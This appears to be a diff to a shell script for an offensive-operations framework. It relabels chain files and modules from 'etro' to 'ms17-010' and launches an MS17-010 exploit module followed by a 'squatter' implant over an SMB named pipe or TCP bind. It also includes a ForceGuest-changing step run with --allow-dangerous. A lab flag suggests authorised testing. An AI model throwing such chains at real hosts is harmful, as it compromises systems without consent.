@@ -16,8 +16,8 @@ smb_user="${HOVEL_SMB_USER:-user}"
 smb_password="${HOVEL_SMB_PASSWORD:-password}"
 smb_domain="${HOVEL_SMB_DOMAIN:-}"
 forceguest="${HOVEL_FORCEGUEST_FIX:-auto}"
-chain_file="$workspace/lab/etro-squatter-${transport}.chain.yaml"
-forceguest_chain="$workspace/lab/etro-forceguest.chain.yaml"
+chain_file="$workspace/lab/ms17-010-squatter-${transport}.chain.yaml"
+forceguest_chain="$workspace/lab/ms17-010-forceguest.chain.yaml"
 
 mkdir -p "$(dirname "$chain_file")"
 
@@ -45,12 +45,12 @@ write_forceguest_chain() {
 apiVersion: hovel.dev/v1alpha1
 kind: Chain
 metadata:
-  name: etro-forceguest
+  name: ms17-010-forceguest
 spec:
   mode: configured
   steps:
     - id: forceguest
-      uses: module:etro-exploit@v1.0.0
+      uses: module:ms17-010-exploit@v1.0.0
   config:
     operator.confirmed_lab: "true"
   targets:
@@ -74,7 +74,7 @@ maybe_disable_forceguest() {
     echo "SMB admin probe succeeded; ForceGuest remediation not needed"
     return 0
   fi
-  echo "SMB admin probe failed; throwing Etro ForceGuest remediation"
+  echo "SMB admin probe failed; throwing MS17-010 ForceGuest remediation"
   write_forceguest_chain
   HOVEL_MODULE_CONFIG="$module_config" HOVEL_WORKSPACE="$workspace" task throw -- "$forceguest_chain" --allow-dangerous --now
   sleep 3
@@ -89,12 +89,12 @@ cat >"$chain_file" <<EOF
 apiVersion: hovel.dev/v1alpha1
 kind: Chain
 metadata:
-  name: etro-squatter-${transport}
+  name: ms17-010-squatter-${transport}
 spec:
   mode: configured
   steps:
     - id: exploit
-      uses: module:etro-exploit@v1.0.0
+      uses: module:ms17-010-exploit@v1.0.0
     - id: squatter
       uses: module:squatter@v0.1.0
   config:
@@ -125,9 +125,9 @@ EOF
 
 echo "Wrote $chain_file"
 if [[ "$transport" == "smb-named-pipe" ]]; then
-  echo "Throwing Etro -> Squatter SMB named pipe at $target_host (${pipe_name})"
+  echo "Throwing MS17-010 -> Squatter SMB named pipe at $target_host (${pipe_name})"
 else
-  echo "Throwing Etro -> Squatter TCP bind at $target_host:$bind_port"
+  echo "Throwing MS17-010 -> Squatter TCP bind at $target_host:$bind_port"
 fi
 SQUATTER_PAYLOAD_PATH="$squatter_payload" HOVEL_MODULE_CONFIG="$module_config" HOVEL_WORKSPACE="$workspace" task throw -- "$chain_file" --allow-dangerous --now
 echo
